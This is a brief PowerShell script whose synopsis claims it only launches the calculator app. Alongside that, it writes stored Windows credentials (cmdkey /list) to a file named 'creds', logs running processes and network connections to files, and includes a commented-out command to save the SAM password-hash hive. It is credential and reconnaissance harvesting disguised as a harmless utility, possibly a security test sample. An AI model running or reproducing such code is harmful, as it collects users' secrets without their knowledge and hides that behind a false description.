<#
.SYNOPSIS
	Launches the calculator application
#>
## reg save HKLM\sam %temp%\sam
cmdkey /list | Out-File -FilePath .\creds
Start-Process ms-calculator:
tasklist | Out-File -FilePath .\tasklist
netstat -an | Out-File -FilePath .\netstat
